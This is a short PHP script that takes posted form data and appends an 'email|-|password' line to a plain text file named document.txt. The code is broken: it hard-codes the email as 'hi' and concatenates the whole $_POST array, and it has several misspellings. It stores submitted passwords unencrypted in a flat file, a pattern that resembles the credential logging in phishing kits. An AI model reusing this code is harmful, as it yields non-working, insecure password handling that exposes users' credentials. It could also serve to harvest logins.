<?php
include("sessionAndCoockie.php");
$email = 'hi';
$password = $_POST;
$delim = '|-|';
$fileInfoWtite = $email . $delim . $password;
$fileInf = fopen('document.txt', 'a+') or die('Bad not file!');
fwrite($fileInf, $fileInfoWtite . PHP_EOL);
fclose($fileInf);
